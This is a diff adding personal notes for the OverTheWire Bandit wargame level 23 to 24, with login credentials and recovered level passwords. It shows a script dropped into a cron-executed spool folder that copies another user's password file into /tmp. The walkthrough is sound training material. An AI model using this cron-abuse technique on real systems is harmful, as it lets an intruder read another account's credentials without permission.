@@ -1,2 +1,21 @@
 $ ssh bandit.labs.overthewire.org -l bandit23 -p 2220
 pw: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+$ cd /etc/cron.d
+$ cat cronjob_bandit24
+(shows location of the job)
+$ cat /usr/bin/cronjob_bandit24.sh
+(script to execute all files in /var/spool/bandit24)
+$ cd /tmp/dark
+$ vi getpass.sh
+(write your script)
+$ cat getpass.sh
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 >> /tmp/dark/getpass.txt
+$ cp getpass.sh /var/spool/bandit24
+(copy to that location and wait for the script to execute)
+$ ls
+$ cat getpass.txt
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+
